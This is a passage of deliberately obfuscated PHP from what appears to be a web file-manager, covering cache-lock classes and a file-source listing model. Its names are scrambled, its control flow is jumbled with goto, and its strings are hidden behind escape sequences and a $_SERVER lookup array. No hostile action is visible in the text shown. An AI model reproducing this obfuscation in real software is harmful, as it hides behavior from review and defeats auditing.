call_user_func_array(self::$_methodListStatic[$bÜ¿¯¸“‡], $Eİ­ÎÏŞÅ); } else { if (method_exists(self, $bÜ¿¯¸“‡)) { return call_user_func_array(array(self, $bÜ¿¯¸“‡), $Eİ­ÎÏŞÅ); } else { show_json("{$bÜ¿¯¸“‡}\50\51\40\x6e\x6f\x74\40\x65\x78\x69\x73\164\x3b", !1); } } } public static function addMethod($B‡‘İñõÕ÷, $eä‰¾ÇÊÊÎ) { self::$_methodList[$B‡‘İñõÕ÷] = $eä‰¾ÇÊÊÎ; } public static function addMethodStatic($aà¸ÂİÉ©œ, $b›õß¼ÏˆĞ) { self::$_methodListStatic[$aà¸ÂİÉ©œ] = $b›õß¼ÏˆĞ; } } goto c„ …îáÁÁ; D¡‡·µğÚ: class CacheLockRedis { public function lock($f¶ÛñäÊôÎ, $eæŠ…ê…™¼ = 10) { $CíùˆÊ„„Ö = Cache::init(); $B·ä¯™çÑÒ = microtime(!0) + $eæŠ…ê…™¼; while (microtime(!0) < $B·ä¯™çÑÒ) { $d±£¬ç”ÌÇ = $CíùˆÊ„„Ö->get($f¶ÛñäÊôÎ); if (!$d±£¬ç”ÌÇ) { $FÙ´ËåÂª = $CíùˆÊ„„Ö->setLock($f¶ÛñäÊôÎ, $B·ä¯™çÑÒ, $eæŠ…ê…™¼); if ($FÙ´ËåÂª) { return !0; } } else { if ($d±£¬ç”ÌÇ < microtime(!0)) { $CíùˆÊ„„Ö->set($f¶ÛñäÊôÎ, $B·ä¯™çÑÒ, $eæŠ…ê…™¼ * 2); if ($CíùˆÊ„„Ö->get($f¶ÛñäÊôÎ) === $d±£¬ç”ÌÇ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Fî¾îÎÃğã) { return Cache::init()->get($Fî¾îÎÃğã); } public function unlock($dœİÜšÂŠµ) { return Cache::init()->remove($dœİÜšÂŠµ); } } class CacheLockMemcached { public function lock($D·ßòÒ»Â, $AŸ¯Ñ­¨É = 0) { $e‘Âˆ¡¥áó = Cache::init(); $Cß˜ä«©Ôø = microtime(!0) + $AŸ¯Ñ­¨É; while (microtime(!0) < $Cß˜ä«©Ôø) { $EİŞ‡…ĞÎ = $e‘Âˆ¡¥áó->get($D·ßòÒ»Â); if (!$EİŞ‡…ĞÎ || $EİŞ‡…ĞÎ < microtime(!0)) { $bŞÏ“ÇÕÊ = $e‘Âˆ¡¥áó->handle->add($D·ßòÒ»Â, $Cß˜ä«©Ôø, $AŸ¯Ñ­¨É); if ($bŞÏ“ÇÕÊ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($dÔˆˆŒ‚ÆÔ) { return Cache::init()->get($dÔˆˆŒ‚ÆÔ); } public function unlock($Bò‹•¿Ô°) { return Cache::init()->remove($Bò‹•¿Ô°); } } class CacheLockDatabase { public function lock($aŠöó›è, $e×äÙô„Ô = 0) { $DÀ¬¬ÊĞ = Model($_SERVER[ç][764]); $AìñƒÀÔ = microtime(!0) + $e×äÙô„Ô; while (microtime(!0) < $AìñƒÀÔ) { $AÖ¬îåÀÊâ = $DÀ¬¬ÊĞ->get($aŠöó›è); if (!$AÖ¬îåÀÊâ || $AÖ¬îåÀÊâ < microtime(!0)) { $CÊùâ±¡åÌ = $DÀ¬¬ÊĞ->set($aŠöó›è, $AìñƒÀÔ); if ($CÊùâ±¡åÌ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($fÌìÑÖˆ¨´) { return Model($_SERVER[ç][764])->get($fÌìÑÖˆ¨´); } public function unlock($AöÍ‘î–¿¡) { Model($_SERVER[ç][764])->remove($AöÍ‘î–¿¡); } } goto CÇÌ’Ÿ¨÷“; Eàïõ†ä¡Û: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\162\143\145"; protected $tableMeta = array("\164\141\x62\154\145\116\x61\155\x65" => "\x69\157\x5f\x73\x6f\165\162\x63\145\x5f\155\145\164\141", "\155\145\164\141\106\x69\145\x6c\x64" => "\163\157\x75\x72\143\x65\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\x69\x66\171\x54\151\155\145", "\164\151\155\x65", "\151\x6e\x73\x65\162\164", "\x66\165\156\143\x74\151\157\x6e"), array("\143\162\x65\x61\x74\145\124\151\x6d\x65", "\x74\x69\155\x65", "\151\156\x73\x65\162\164", "\x66\x75\x6e\x63\x74\x69\x6f\156"), array("\x76\x69\x65\x77\124\x69\155\x65", "\164\x69\155\145", "\151\x6e\x73\145\162\x74", "\x66\165\156\143\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($dàˆØòÒ) { return $this->listSource(array($_SERVER[ç][389] => $dàˆØòÒ)); } public function typeName($dé‚¿¹ªùÖ) { static $D…‚ò­ŒÊì = array(self::TYPE_SYSTEM => "\x73\171\163\x74\145\155", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\x67\162\x6f\165\160"); return $D…‚ò­ŒÊì[$dé‚¿¹ªùÖ . $_SERVER[ç][33]]; } public function sourceListInfo($céÃË““£–, $b„‰´“ = false) { goto aäÛ…­±¾; cØÚ²í¡ö: return array_to_keyvalue($Eã×‹êÆ , $BßŞÇÊœŞ[390]); goto ešŸ¢¹¤½«; aäÛ…­±¾: $BßŞÇÊœŞ =& $_SERVER[ç]; $céÃË““£– = $céÃË““£– ? $céÃË““£– : array(); $céÃË““£– = array_filter(array_unique($céÃË““£–)); goto F‰ÄõÃªØ¸; F‰ÄõÃªØ¸: if (!$céÃË““£–) { return array(); } $Eã×‹êÆ  = $this->where(array($BßŞÇÊœŞ[390] => array($BßŞÇÊœŞ[7], $céÃË““£–)))->select(); $this->_listDataApply($Eã×‹êÆ , $b„‰´“); goto cØÚ²í¡ö; ešŸ¢¹¤½«: } public function pathInfoFilter(&$e¸²öùÄ) { goto f‰ÄÆ†ô»Î; a…°­´ÎÑ: if (!$A¤ŞÇéÎ§¥) { goto BÍÖÑ¿ˆ¯‘; E¬ÌÒÁ¿‰: $CÑ‡ ˆÉÒ = $föõâ÷ğ[394]; $c­µ‡ŒßñÒ = explode($föõâ÷ğ[47], $CÑ‡ ˆÉÒ); $A¤ŞÇéÎ§¥ = explode($föõâ÷ğ[47], $còó£ù¡˜°); goto dÊÄç…—¨Ö; BÍÖÑ¿ˆ¯‘: $còó£ù¡˜° = $föõâ÷ğ[391]; $còó£ù¡˜° .= $föõâ÷ğ[392]; $còó£ù¡˜° .= $föõâ÷ğ[393]; goto E¬ÌÒÁ¿‰; dÊÄç…—¨Ö: $E¢ï‘ìê¹• = array(); foreach ($A¤ŞÇéÎ§¥ as $fßä„ì­Ç) { if (in_array($fßä„ì­Ç, $c­µ‡ŒßñÒ)) { continue; } $E¢ï‘ìê¹•[] = $fßä„ì­Ç; } goto a…êÌ“¶óÆ; a…êÌ“¶óÆ: } $e¸²öùÄ[$föõâ÷ğ[75]] = $föõâ÷ğ[395] . $e¸²öùÄ[$föõâ÷ğ[390]] . $föõâ÷ğ[396]; $e¸²öùÄ[$föõâ÷ğ[29]] = $e¸²öùÄ[$föõâ÷ğ[397]] == 1 ? $föõâ÷ğ[76] : $föõâ÷ğ[173]; goto fƒÖİ™ÜìÍ; f‰ÄÆ†ô»Î: $föõâ÷ğ =& $_SERVER[ç]; static $A¤ŞÇéÎ§¥ = false; static $E¢ï‘ìê¹• = false; goto a…°­´ÎÑ; C„åÌ…Ï¤Û: if (isset($e¸²öùÄ[$föõâ÷ğ[400]]) && $e¸²öùÄ[$föõâ÷ğ[400]][$föõâ÷ğ[401]] == -1) { $d£ÈìÜÃİ» = $E¢ï‘ìê¹•; } $e¸²öùÄ = array_field_key($e¸²öùÄ, $d£ÈìÜÃİ»); return $e¸²öùÄ; goto Fš£–ÒÛ×‹; fƒÖİ™ÜìÍ: $e¸²öùÄ[$föõâ÷ğ[398]] = $this->typeName($e¸²öùÄ[$föõâ÷ğ[398]]); if ($e¸²öùÄ[$föõâ÷ğ[397]] != 1) { $e¸²öùÄ[$föõâ÷ğ[167]] = $e¸²öùÄ[$föõâ÷ğ[399]]; unset($e¸²öùÄ[$föõâ÷ğ[399]]); } $d£ÈìÜÃİ» = $A¤ŞÇéÎ§¥; goto C„åÌ…Ï¤Û; Fš£–ÒÛ×‹: } public function listUserFav() { goto bˆˆÁ˜ĞÖ¨; D´¯¬Üá×: foreach ($eªí´„±ˆ– as &$BŒ¶»íµë) { $BŒ¶»íµë = array($E´¡íÏ¬Ñ§[406] => $BŒ¶»íµë[$E´¡íÏ¬Ñ§[388]], $E´¡íÏ¬Ñ§[407] => $BŒ¶»íµë[$E´¡íÏ¬Ñ§[28]], $E´¡íÏ¬Ñ§[408] => $BŒ¶»íµë[$E´¡íÏ¬Ñ§[75]], $E´¡íÏ¬Ñ§[409] => $BŒ¶»íµë[$E´¡íÏ¬Ñ§[29]], $E´¡íÏ¬Ñ§[410] => $BŒ¶»íµë[$E´¡íÏ¬Ñ§[192]], $E´¡íÏ¬Ñ§[411] => $BŒ¶»íµë[$E´¡íÏ¬Ñ§[83]]); if ($BŒ¶»íµë[$E´¡íÏ¬Ñ§[29]] == $E´¡íÏ¬Ñ§[403] && $AâË‰ùãëå[$BŒ¶»íµë[$E´¡íÏ¬Ñ§[75]]]) { $BŒ¶»íµë[$E´¡íÏ¬Ñ§[84]] = $AâË‰ùãëå[$BŒ¶»íµë[$E´¡íÏ¬Ñ§[75]]]; } } unset($BŒ¶»íµë); return $eªí´„±ˆ–; goto e¦ÕÏ¸â; cù†½Úä³Ê: $cå†õµ»ø = array_to_keyvalue($cå†õµ»ø, $E´¡íÏ¬Ñ§[33], $E´¡íÏ¬Ñ§[75]); if ($cå†õµ»ø) { $AâË‰ùãëå = $this->listSource(array($E´¡íÏ¬Ñ§[404] => array($E´¡íÏ¬Ñ§[405], $cå†õµ»ø))); } $AâË‰ùãëå = array_to_keyvalue($AâË‰ùãëå[$E´¡íÏ¬Ñ§[365]], $E´¡íÏ¬Ñ§[390]); goto D´¯¬Üá×; bˆˆÁ˜ĞÖ¨: $E´¡íÏ¬Ñ§ =& $_SERVER[ç]; $eªí´„±ˆ– = Model($E´¡íÏ¬Ñ§[402])->listData(); $cå†õµ»ø = array_filter_by_field($eªí´„±ˆ–, $E´¡íÏ¬Ñ§[29], $E´¡íÏ¬Ñ§[403]); goto cù†½Úä³Ê; e¦ÕÏ¸â: } public function listUserTag($b‘‡µ¤­µ) { goto C²¸¬øË´¶; CÕŠá’¿Ò§: if ($bÙ˜…ç¨¼) { Model($CÊÛŸ´º–Ë[414])->removeBySource($bÙ˜…ç¨¼); } return $Fã¨ÄªÙµÒ; goto F¯ù¥àñÅ†; bÖ³‡ŒÀ©ë: if (!$Fã¨ÄªÙµÒ || count($Fò´Ÿ¢§‚ñ) == $Fã¨ÄªÙµÒ[$CÊÛŸ´º–Ë[362]][$CÊÛŸ´º–Ë[363]]) { return $Fã¨ÄªÙµÒ; } $bÙ˜…ç¨¼ = array(); $FƒÂ†ºòÔ˜ = array_to_keyvalue($Fã¨ÄªÙµÒ[$CÊÛŸ´º–Ë[74]], $CÊÛŸ´º–Ë[33], $CÊÛŸ´º–Ë[390]); goto Dï‚»èôõ¡; Dï‚»èôõ¡: $böÌĞ•êâ = array_to_keyvalue($Fã¨ÄªÙµÒ[$CÊÛŸ´º–Ë[73]], $CÊÛŸ´º–Ë[33], $CÊÛŸ´º–Ë[390]); $Aèæ‚½õ‘ğ = array_merge($böÌĞ•êâ, $FƒÂ†ºòÔ˜); foreach ($Fò´Ÿ¢§‚ñ as $Eäá¢šãº¬) { if (!in_array($Eäá¢šãº¬, $Aèæ‚½õ‘ğ)) { $bÙ˜…ç¨¼[] = $Eäá¢šãº¬; } } goto CÕŠá’¿Ò§; C²¸¬øË´¶: $CÊÛŸ´º–Ë =& $_SERVER[ç]; if ($b‘‡µ¤­µ && !is_array($b‘‡µ¤­µ)) { $b‘‡µ¤­µ = array($b‘‡µ¤­µ); } $d´ÅêÉé×Ï = Model($CÊÛŸ´º–Ë[412])->listData(); goto AÁ’¸¬ñ­; Aê“ñìïôÍ: foreach ($DÛŸ™Ø©÷¯ as $a²³ÇïÓØÓ => $C•ÏµÈ½²) { $cŒôÛ—‹ = !0; if (!$b‘‡µ¤­µ) { $Fò´Ÿ¢§‚ñ[] = $a²³ÇïÓØÓ; continue; } foreach ($b‘‡µ¤­µ as $Añç¢ó“¿) { if (!in_array($Añç¢ó“¿, $C•ÏµÈ½²)) { $cŒôÛ—‹ = !1; break; } } if ($cŒôÛ—‹) { $Fò´Ÿ¢§‚ñ[] = $a²³ÇïÓØÓ; } } if (!$Fò´Ÿ¢§‚ñ) { return array(); } $Fã¨ÄªÙµÒ = $this->listSource(array($CÊÛŸ´º–Ë[404] => array($CÊÛŸ´º–Ë[405], $Fò´Ÿ¢§‚ñ))); goto bÖ³‡ŒÀ©ë; AÁ’¸¬ñ­: $DÛŸ™Ø©÷¯ = array(); foreach ($d´ÅêÉé×Ï as $cÆß‚Åˆïö) { $Eäá¢šãº¬ = $cÆß‚Åˆïö[$CÊÛŸ´º–Ë[75]]; if (!$Eäá¢šãº¬) { continue; } if (!isset($DÛŸ™Ø©÷¯[$Eäá¢šãº¬])) { $DÛŸ™Ø©÷¯[$Eäá¢šãº¬] = array(); } $DÛŸ™Ø©÷¯[$Eäá¢šãº¬][] = $cÆß‚Åˆïö[$CÊÛŸ´º–Ë[413]]; } $Fò´Ÿ¢§‚ñ = array(); goto Aê“ñìïôÍ; F¯ù¥àñÅ†: } public function listUserRecycle() { $e¸šõËè¥ =& $_SERVER[ç]; $e°˜¿…ÖÉ = Model($e¸šõËè¥[415])->listData(); if (!$e°˜¿…ÖÉ) { return array(); } $d‘½¨º„¾ = array($e¸šõËè¥[404] => array($e¸šõËè¥[405], $e°˜¿…ÖÉ), $e¸šõËè¥[416] => 1); return $this->listSource($d‘½¨º„¾); } public function listSource($aåò©¨ƒİ©, $eÖ•†áóÑ† = 3000) { goto bäŞˆ”œÕ; bäŞˆ”œÕ: $EĞŸÊ†òêÈ =& $_SERVER[ç]; if (!isset($aåò©¨ƒİ©[$EĞŸÊ†òêÈ[417]])) { $aåò©¨ƒİ©[$EĞŸÊ†òêÈ[417]] = 0; } $b‹›±Ë¿Õù = $EĞŸÊ†òêÈ[418]; goto F‚Ä”†„’•; F‚Ä”†„’•: $F¿ƒ²‡¼Ê” = $this->field($b‹›±Ë¿Õù)->_makeOrder()->where($aåò©¨ƒİ©)->selectPage($eÖ•†áóÑ†); $this->_listDataApply($F¿ƒ²‡¼Ê”[$EĞŸÊ†òêÈ[365]]); $this->_listMake($F¿ƒ²‡¼Ê”); goto cÂ—‚ô»£’; cÂ—‚ô»£’: return $F¿ƒ²‡¼Ê”; goto B¹˜¾ç¶§; B¹˜¾ç¶§: } protected function _makeOrder() { goto Eä©âŸÛã; B®ÔĞŞÌß–: if ($cãÆŠ®½‚ == $C’À”é‹¾[28]) { } $fÔßÒá±·± = $C’À”é‹¾[431] . $F‹‰ë‘Š[$cãÆŠ®½‚] . $C’À”é‹¾[50] . $DƒƒÒÃ·Ë‰[$BÅ Í‚ö¥]; return $this->order(rtrim(trim($fÔßÒá±·±), $C’À”é‹¾[47])); goto fòà¥Õ™­; Eä©âŸÛã: $C’À”é‹¾ =& $_SERVER[ç]; $bö¯ô•Á¿ = Model($C’À”é‹¾[419])->get($C’À”é‹¾[420]); $b ‘†¿§ºó = Model($C’À”é‹¾[419])->get($C’À”é‹¾[421]); goto AÙ‡ó«ƒ¿­; AÙ‡ó«ƒ¿­: $DƒƒÒÃ·Ë‰ = array($C’À”é‹¾[422] => $C’À”é‹¾[423], $C’À”é‹¾[424] => $C’À”é‹¾[425]); $F‹‰ë‘Š = array($C’À”é‹¾[28] => $C’À”é‹¾[28], $C’À”é‹¾[77] => $C’À”é‹¾[77], $C’À”é‹¾[167] => $C’À”é‹¾[399], $C’À”é‹¾[426] => $C’À”é‹¾[426], $C’À”é‹¾[427] => $C’À”é‹¾[428], $C’À”é‹¾[192] => $C’À”é‹¾[192], $C’À”é‹¾[83] => $C’À”é‹¾[83]); $cãÆŠ®½‚ = Input::get($C’À”é‹¾[429], $C’À”é‹¾[7], $bö¯ô•Á¿, array_keys($F‹‰ë‘Š)); goto Dç¹¨œ‘“; Dç¹¨œ‘“: $BÅ Í‚ö¥ = Input::get($C’À”é‹¾[430], $C’À”é‹¾[7], $b ‘†¿§ºó, array_keys($DƒƒÒÃ·Ë‰)); if (!in_array($cãÆŠ®½‚, array_keys($F‹‰ë‘Š))) { $cãÆŠ®½‚ = $C’À”é‹¾[28]; } if (!in_array($BÅ Í‚ö¥, array_keys($DƒƒÒÃ·Ë‰))) { $cãÆŠ®½‚ = $C’À”é‹¾[422]; } goto B®ÔĞŞÌß–; fòà¥Õ™­: } protected function _listDataApplyItem($dçÛ‚é”’, $DšŞÚ¦±«‹ = false) { $f¸¼à±­ê = array($dçÛ‚é”’); $this->_listDataApply($f¸¼à±­ê, $DšŞÚ¦±«‹); return $f¸¼à±­ê[0]; } protected function _listDataApply(&$B›©†Îµ, $a‘©§Âäğí = false) { goto AÓ‹¤§Âßƒ; AÓ‹¤§Âßƒ: $CƒÆ™ùù‚Á =& $_SERVER[ç]; if (!$B›©†Îµ) { $B›©†Îµ = array(); return; } $Eƒ«Åè« = array_to_keyvalue($B›©†Îµ, $CƒÆ™ùù‚Á[33], $CƒÆ™ùù‚Á[390]); goto cÄÄÒ²ø; c©ŒØ³¡‚: $this->_listAppendUser($B›©†Îµ); $this->_listFilterInfo($B›©†Îµ, $a‘©§Âäğí); goto FÚ”ƒà±ì—; DáøƒËê¹: $this->_listAppendPath($B›©†Îµ); $this->_listAppendAuth($B›©†Îµ); $this->_listAppendSourceInfo($B›©†Îµ, $Eƒ«Åè«); goto c©ŒØ³¡‚; cÄÄÒ²ø: $Eƒ«Åè« = array_unique($Eƒ«Åè«); $this->_listSourceCache($B›©†Îµ); if (!$a‘©§Âäğí) { $this->_listAppendMeta($B›©†Îµ, $Eƒ«Åè«); $this->_listAppendFileMeta($B›©†Îµ, $Eƒ«Åè«); $this->_listAppendChildren($B›©†Îµ, $Eƒ«Åè«); } goto DáøƒËê¹; FÚ”ƒà±ì—: } protected function _listSourceCache($aËäòŒá‹Á) { $eë„´æÃ =& $_SERVER[ç]; foreach ($aËäòŒá‹Á as $a¹îèõ—µÙ) { self::$cacheSourceInfo[$eë„´æÃ[432] . $a¹îèõ—µÙ[$eë„´æÃ[390]]] = $a¹îèõ—µÙ; } } protected function _listFilterInfo(&$E»ğÓ”˜, $Cí…à‰êÆº = false) { $bÚÔŠñ÷ª =& $_SERVER[ç]; foreach ($E»ğÓ”˜ as &$Fò¬óÌä†‹) { $Fò¬óÌä†‹ = $this->pathInfoFilter($Fò¬óÌä†‹); self::$cachePathInfo[$bÚÔŠñ÷ª[433] . intval($Cí…à‰êÆº) . $bÚÔŠñ÷ª[434] . $Fò¬óÌä†‹[$bÚÔŠñ÷ª[390]]] = $Fò¬óÌä†‹; } unset($Fò¬óÌä†‹); } protected function _listMake(&$dÖæ‡—˜‹) { $AÌŒŠŞ¹äŒ =& $_SERVER[ç]; $dÖæ‡—˜‹[$AÌŒŠŞ¹äŒ[74]] = array(); $dÖæ‡—˜‹[$AÌŒŠŞ¹äŒ[73]] = array(); foreach ($dÖæ‡—˜‹[$AÌŒŠŞ¹äŒ[365]] as $C“˜¹áòÁØ) { $b˜ãöÖ³É‚ = $C“˜¹áòÁØ[$AÌŒŠŞ¹äŒ[397]] == 1 ? $AÌŒŠŞ¹äŒ[74] : $AÌŒŠŞ¹äŒ[73]; $dÖæ‡—˜‹[$b˜ãöÖ³É‚][] = $C“˜¹áòÁØ; } unset($dÖæ‡—˜‹[$AÌŒŠŞ¹äŒ[365]]); } protected function _listAppendMeta(&$eÂ©Ë²ö, $E²†ÄôœÎ) { goto D•®Ø¢ğÂÕ; D•®Ø¢ğÂÕ: $e×¼ä¾”›· =& $_SERVER[ç]; $añ·á—»Ì = array($e×¼ä¾”›·[404] => array($e×¼ä¾”›·[405], $E²†ÄôœÎ)); $bñÚÎãŠÊÈ = Model($e×¼ä¾”›·[435])->field($e×¼ä¾”›·[436])->where($añ·á—»Ì)->select(); goto a³ìÊ—¢’ó; cğˆğ¢˜÷æ: foreach ($bñÚÎãŠÊÈ as $eÏÈºçÎ) { if (!isset($eõĞÊÄ®ç[$eÏÈºçÎ[$e×¼ä¾”›·[390]]])) { $eõĞÊÄ®ç[$eÏÈºçÎ[$e×¼ä¾”›·[390]]] = array(); } if (in_array($eÏÈºçÎ[$e×¼ä¾”›·[92]], $eÄŸ¤è‚–Ö)) { continue; } $eõĞÊÄ®ç[$eÏÈºçÎ[$e×¼ä¾”›·[390]]][$eÏÈºçÎ[$e×¼ä¾”›·[92]]] = $eÏÈºçÎ[$e×¼ä¾”›·[370]]; } foreach ($eÂ©Ë²ö as &$Eâ‘Œå‰™‚) { $Eâ‘Œå‰™‚[$e×¼ä¾”›·[439]] = !1; if (isset($eõĞÊÄ®ç[$Eâ‘Œå‰™‚[$e×¼ä¾”›·[390]]])) { $Eâ‘Œå‰™‚[$e×¼ä¾”›·[439]] = $eõĞÊÄ®ç[$Eâ‘Œå‰™‚[$e×¼ä¾”›·[390]]]; } if ($this->fileIsLock($Eâ‘Œå‰™‚) && $Eâ‘Œå‰™‚[$e×¼ä¾”›·[400]]) { $d‘²‚èÑ’ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Eâ‘Œå‰™‚[$e×¼ä¾”›·[400]][$e×¼ä¾”›·[401]] = AuthModel::authDisable($Eâ‘Œå‰™‚[$e×¼ä¾”›·[400]][$e×¼ä¾”›·[401]], $d‘²‚èÑ’); $Eâ‘Œå‰™‚[$e×¼ä¾”›·[400]][$e×¼ä¾”›·[440]][$e×¼ä¾”›·[400]] = $Eâ‘Œå‰™‚[$e×¼ä¾”›·[400]][$e×¼ä¾”›·[401]]; } } unset($Eâ‘Œå‰™‚); goto bÒŠóø; a³ìÊ—¢’ó: if (!$bñÚÎãŠÊÈ) { return; } $eÄŸ¤è‚–Ö = array($e×¼ä¾”›·[437], $e×¼ä¾”›·[438]); $eõĞÊÄ®ç = array(); goto cğˆğ¢˜÷æ; bÒŠóø: } protected function _listAppendFileMeta(&$e²®ùñ™éŠ, $b¯Ğƒ¯¤…ù) { goto Aßí’„¼§ğ; BòÅÛ—®µä: if (!$a‘’îƒá·) { return; } $DÛó£´ÛÃé = array($BÉ–´„Ùå[442] => array($BÉ–´„Ùå[405], $a‘’îƒá·)); $c±¡ïˆƒÂ = $BÉ–´„Ùå[443]; goto EªêÓ•Âãä; EªêÓ•Âãä: $f¯º†…ßøŸ = Model($BÉ–´„Ùå[444])->field($c±¡ïˆƒÂ)->where($DÛó£´ÛÃé)->select(); $f¯º†…ßøŸ = array_to_keyvalue($f¯º†…ßøŸ, $BÉ–´„Ùå[441]); $FÒ¬¡Õà´¯ = Model($BÉ–´„Ùå[445])->field($BÉ–´„Ùå[446])->where($DÛó£´ÛÃé)->select(); goto DĞáØÀŒ–¡; DĞáØÀŒ–¡: $FÒ¬¡Õà´¯ = $FÒ¬¡Õà´¯ ? $FÒ¬¡Õà´¯ : array(); $CÜÖ ½¡è = array(); foreach ($FÒ¬¡Õà´¯ as $F‘çÇ‘ §) { if (!isset($CÜÖ ½¡è[$F‘çÇ‘ §[$BÉ–´„Ùå[441]]])) { $CÜÖ ½¡è[$F‘çÇ‘ §[$BÉ–´„Ùå[441]]] = array(); } $CÜÖ ½¡è[$F‘çÇ‘ §[$BÉ–´„Ùå[441]]][$F‘çÇ‘ §[$BÉ–´„Ùå[92]]] = $F‘çÇ‘ §[$BÉ–´„Ùå[370]]; } goto dó˜ŞÅñ§£; Aßí’„¼§ğ: $BÉ–´„Ùå =& $_SERVER[ç]; $a‘’îƒá· = array_to_keyvalue($e²®ùñ™éŠ, $BÉ–´„Ùå[33], $BÉ–´„Ùå[441]); $a‘’îƒá· = array_filter(array_unique($a‘’îƒá·)); goto BòÅÛ—®µä; dó˜ŞÅñ§£: foreach ($e²®ùñ™éŠ as &$f¢ŒÃÏÊÊ) { goto A’­‘ËÄ…ï; FÒôİ¾: if (isset($f¢ŒÃÏÊÊ[$BÉ–´„Ùå[163]][$BÉ–´„Ùå[162]])) { $f¢ŒÃÏÊÊ[$BÉ–´„Ùå[162]] = json_decode($f¢ŒÃÏÊÊ[$BÉ–´„Ùå[163]][$BÉ–´„Ùå[162]], !0); unset($f¢ŒÃÏÊÊ[$BÉ–´„Ùå[163]][$BÉ–´„Ùå[162]]); } goto fíæ™®Ï†; A’­‘ËÄ…ï: $bº¶Ò¬‘ = $f¢ŒÃÏÊÊ[$BÉ–´„Ùå[441]]; if (!$bº¶Ò¬‘ || !isset($f¯º†…ßøŸ[$bº¶Ò¬‘])) { continue; } $aÍ¬©ÃÍÌÎ = $f¯º†…ßøŸ[$bº¶Ò¬‘]; goto D³¸Ûå¾Ëà; c·ŞÌ£ºå: unset($f¯º†…ßøŸ[$bº¶Ò¬‘][$BÉ–´„Ùå[75]]); $d‚ë‹æÔë = is_array($CÜÖ ½¡è[$bº¶Ò¬‘]) ? $CÜÖ ½¡è[$bº¶Ò¬‘] : array(); $f¢ŒÃÏÊÊ[$BÉ–´„Ùå[163]] = array_merge($d‚ë‹æÔë, $f¯º†…ßøŸ[$bº¶Ò¬‘]); goto FÒôİ¾; D³¸Ûå¾Ëà: $aÍ¬©ÃÍÌÎ[$BÉ–´„Ùå[77]] = $f¢ŒÃÏÊÊ[$BÉ–´„Ùå[77]]; $aÍ¬©ÃÍÌÎ[$BÉ–´„Ùå[28]] = $f¢ŒÃÏÊÊ[$BÉ–´„Ùå[28]]; if (!isset(self::$cacheFileInfo[$BÉ–´„Ùå[447] . $bº¶Ò¬‘])) { self::$cacheFileInfo[$BÉ–´„Ùå[447] . $bº¶Ò¬‘] = array_merge(array(), $aÍ¬©ÃÍÌÎ); } goto c·ŞÌ£ºå; fíæ™®Ï†: } unset($f¢ŒÃÏÊÊ); goto bã×äªÁ›Ç; bã×äªÁ›Ç: } protected function _listAppendSourceInfo(&$c–ß±¶¼¯, $fÜÔ«­Â®ñ) { goto B¦£Ã‚¯Œğ; Bˆõì‚±™·: $b…•ó•¨ƒÛ = Model($a¿…ãÕ¤­Ê[412])->listData(); $eµ†ˆî¥ÓÓ = Model($a¿…ãÕ¤­Ê[402])->listData(); $Bœµİ®ç¾ï = Model($a¿…ãÕ¤­Ê[450])->listSimple(); goto bí¿åñŠ; bí¿åñŠ: $AƒÕª‚„ç” = array_to_keyvalue($c‚Î£õÈµ…, $a¿…ãÕ¤­Ê[388]); $e­§¼È¾ğñ = array_to_keyvalue_group($b…•ó•¨ƒÛ, $a¿…ãÕ¤­Ê[75], $a¿…ãÕ¤­Ê[413]); $bôÉ”‡Š¬ = array_to_keyvalue($eµ†ˆî¥ÓÓ, $a¿…ãÕ¤­Ê[75]); goto f®Ã¤˜™¹; B¦£Ã‚¯Œğ: $a¿…ãÕ¤­Ê =& $_SERVER[ç]; if (!defined($a¿…ãÕ¤­Ê[448])) { return; } $c‚Î£õÈµ… = Model($a¿…ãÕ¤­Ê[449])->listData(); goto Bˆõì‚±™·; CäŒê‘è…®: return $c–ß±¶¼¯; goto e˜†ˆœğƒò; f®Ã¤˜™¹: $b„õ°Ğé¶Õ = array_to_keyvalue_group($Bœµİ®ç¾ï, $a¿…ãÕ¤­Ê[390]); foreach ($c–ß±¶¼¯ as &$aîŒøùšš¥) { $aîŒøùšš¥[$a¿…ãÕ¤­Ê[84]] = array($a¿…ãÕ¤­Ê[451] => 0, $a¿…ãÕ¤­Ê[452] => 0, $a¿…ãÕ¤­Ê[453] => 0); if (isset($bôÉ”‡Š¬[$aîŒøùšš¥[$a¿…ãÕ¤­Ê[390]]])) { $aîŒøùšš¥[$a¿…ãÕ¤­Ê[84]][$a¿…ãÕ¤­Ê[454]] = 1; $aîŒøùšš¥[$a¿…ãÕ¤­Ê[84]][$a¿…ãÕ¤­Ê[455]] = $bôÉ”‡Š¬[$aîŒøùšš¥[$a¿…ãÕ¤­Ê[390]]][$a¿…ãÕ¤­Ê[28]]; } if (isset($e­§¼È¾ğñ[$aîŒøùšš¥[$a¿…ãÕ¤­Ê[390]]])) { $aîŒøùšš¥[$a¿…ãÕ¤­Ê[84]][$a¿…ãÕ¤­Ê[456]] = array(); foreach ($e­§¼È¾ğñ[$aîŒøùšš¥[$a¿…ãÕ¤­Ê[390]]] as $eß„ ’Äéö) { $aÔ‚Ší‚™ = $AƒÕª‚„ç”[$eß„ ’Äéö]; $aîŒøùšš¥[$a¿…ãÕ¤­Ê[84]][$a¿…ãÕ¤­Ê[456]][] = array($a¿…ãÕ¤­Ê[457] => $aÔ‚Ší‚™[$a¿…ãÕ¤­Ê[388]], $a¿…ãÕ¤­Ê[407] => $aÔ‚Ší‚™[$a¿…ãÕ¤­Ê[28]], $a¿…ãÕ¤­Ê[458] => $aÔ‚Ší‚™[$a¿…ãÕ¤­Ê[459]]); } } if (isset($b„õ°Ğé¶Õ[$aîŒøùšš¥[$a¿…ãÕ¤­Ê[390]]])) { $aîŒøùšš¥[$a¿…ãÕ¤­Ê[84]][$a¿…ãÕ¤­Ê[460]] = array(); foreach ($b„õ°Ğé¶Õ[$aîŒøùšš¥[$a¿…ãÕ¤­Ê[390]]] as $aÜ¬ÃÀéÛ) { $aîŒøùšš¥[$a¿…ãÕ¤­Ê[84]][$a¿…ãÕ¤­Ê[460]] = 